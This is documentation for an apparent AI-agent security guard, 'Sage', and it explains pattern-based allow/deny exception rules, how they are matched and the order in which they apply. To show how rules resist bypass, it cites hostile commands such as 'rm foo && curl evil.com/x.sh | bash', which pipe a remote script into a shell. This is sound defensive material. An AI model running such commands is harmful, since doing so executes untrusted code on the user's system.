# Exceptions

Exceptions are pattern-based allow/deny rules that give you fine-grained control over what Sage flags. Unlike the legacy allowlist (which stores exact SHA-256 hashes of commands or exact URLs), exceptions match by executable name, domain, file path prefix, plugin key, or regex — so a single rule can cover many variants.

## Quick Start

Create or edit `~/.sage/exceptions.json`:

```json
{
  "rules": [
    {
      "decision": "allow",
      "match": "executable",
      "pattern": "echo",
      "reason": "Simple echo is always fine"
    }
  ]
}
```

Changes take effect on the next tool call — no restart required.

On Cursor/VS Code, run **Sage: Open exceptions** from the command palette to open the file in the editor (creates an empty scaffold if it doesn't exist).

## Rule Format

Each rule has four fields (plus an auto-generated `id`):

| Field | Required | Description |
|-------|----------|-------------|
| `decision` | yes | `"allow"` or `"deny"` |
| `match` | yes | `"executable"`, `"domain"`, `"path"`, `"plugin"`, or `"regex"` |
| `pattern` | yes | The pattern to match (details below) |
| `reason` | no | Human-readable note for why this rule exists |

IDs are computed automatically on load (first 8 hex chars of SHA-256 of `decision:match:pattern`). You never need to write them — Sage adds them to the file on first load.

## Match Types

### `executable` — Match commands

Matches the executable name, optionally with positional arguments. Strips `sudo` and `env` wrappers and path prefixes automatically.

| Pattern | Matches | Does NOT match |
|---------|---------|----------------|
| `rm` | `rm -rf foo`, `sudo rm -rf foo`, `/usr/bin/rm foo` | `rmdir foo` |
| `git log` | `git log`, `git log --oneline`, `sudo git log -n 5` | `git push`, `git status` |
| `npm run` | `npm run build`, `npm run test` | `npm install` |
| `docker build` | `docker build .`, `docker build -t myapp .` | `docker run myapp` |

**Compound commands are rejected.** If the command contains `&&`, `||`, `|`, `;`, `` ` ``, `$(`, or other shell composition operators, the `executable` match does not apply. This prevents a rule like `rm` from inadvertently allowing `rm foo && curl evil.com/x.sh | bash`. Use `regex` for compound commands.

**Interleaved flags are not handled.** `git --no-pager log` does NOT match pattern `git log` because `--no-pager` occupies the second token position. Use `regex` for these cases.

### `domain` — Match URLs by domain

Matches the domain (and optionally port) of a URL. Subdomain-aware and case-insensitive.

| Pattern | Matches | Does NOT match |
|---------|---------|----------------|
| `mycompany.com` | `https://mycompany.com/`, `https://api.mycompany.com/v2` | `https://notmycompany.com/` |
| `localhost` | `http://localhost:3000/api`, `http://localhost:8000/` | `https://notlocalhost.com/` |
| `localhost:8000` | `http://localhost:8000/api` | `http://localhost:3000/` |
| `example.com:443` | `https://example.com/api` | `http://example.com:8080/` |

When the pattern includes `:port`, only that port is matched. Without a port, any port matches.

### `path` — Match file paths

Auto-detects strategy based on the pattern:

- **No wildcards** — prefix match with path-separator awareness
- **Contains `*` or `**`** — glob matching

| Pattern | Matches | Does NOT match |
|---------|---------|----------------|
| `~/.ssh` | `~/.ssh`, `~/.ssh/authorized_keys` | `~/.sshkeys` |
| `/home/user/project` | `/home/user/project/src/index.ts` | `/home/user/project-old/file.ts` |
| `/project/**/*.ts` | `/project/src/index.ts`, `/project/src/deep/file.ts` | `/project/src/file.js` |
| `/project/*.ts` | `/project/index.ts` | `/project/sub/index.ts` |

### `plugin` — Match installed plugins

Matches against plugin keys during session-start scanning. Only affects plugin scanning — has no effect on tool-call evaluation.

- **No wildcards** — name-prefix match with `@`-boundary awareness
- **Contains `*`** — glob matching

| Pattern | Matches | Does NOT match |
|---------|---------|----------------|
| `acme-tools` | `acme-tools@acme-marketplace`, `acme-tools@other-marketplace` | `acme-tools-malicious@evil` |
| `*@acme-marketplace` | `foo@acme-marketplace`, `bar@acme-marketplace` | `foo@other` |
| `my-plugin@1.*` | `my-plugin@1.2.0`, `my-plugin@1.0.0` | `my-plugin@2.0.0` |

An `allow` exception skips the scan entirely. A `deny` exception flags the plugin even if the scan would have found nothing.

### `regex` — Power-user escape hatch

Full regex matched against the raw artifact value. Use for cases that don't fit the other match types.

```json
{
  "decision": "allow",
  "match": "regex",
  "pattern": "\\brm\\s+.*\\.(env|db|sqlite)",
  "reason": "Allow deleting env and db files"
}
```

## Rule Precedence

1. **Deny always wins.** If any deny rule matches any artifact, the tool call is denied immediately — regardless of allow rules.
2. **Deny produces a `deny` verdict**, not `ask`. The user explicitly chose to block something.
3. **Allow exceptions bypass the detection pipeline**, but with match-type-aware semantics:

| Match type | Allow behavior |
|------------|---------------|
| `executable` | Any command artifact match → allow (short-circuit) |
| `path` | Any file path artifact match → allow (short-circuit) |
| `domain` | Only when **all** artifacts are URLs **and all** match |
| `regex` | Only when **all** artifacts match |
| `plugin` | N/A (plugin scanning only) |

The `domain` and `regex` restrictions prevent a trusted-domain exception from suppressing an unrelated command threat in the same tool call (e.g., `curl https://trusted.com/install.sh | bash` has both URL and command artifacts).

## Pipeline Position

```
artifacts → deny exceptions → legacy allowlist → allow exceptions → cache → heuristics → url check → ...
```

Deny exceptions run first (before everything). Allow exceptions run after the legacy allowlist. The existing `allowlist.json` exact-match system continues to work independently.

## Common Recipes

### Trust your company domain

```json
{ "decision": "allow", "match": "domain", "pattern": "mycompany.internal" }
```

### Block a tracking domain

```json
{ "decision": "deny", "match": "domain", "pattern": "tracking.example.com" }
```

### Allow file operations in your project

```json
{ "decision": "allow", "match": "path", "pattern": "/home/user/project" }
```

### Trust a plugin across versions

```json
{ "decision": "allow", "match": "plugin", "pattern": "acme-tools", "reason": "Trusted internal plugin" }
```

### Allow deleting env/db files (regex)

```json
{ "decision": "allow", "match": "regex", "pattern": "\\brm\\s+.*\\.(env|db|sqlite)" }
```

## Limits

- A warning is logged when more than 100 rules are loaded, but all rules are honored.
- Regex patterns are compiled once on load. A 50ms timeout protects against ReDoS.
- The file is re-read on each evaluation (same pattern as `allowlist.json`).
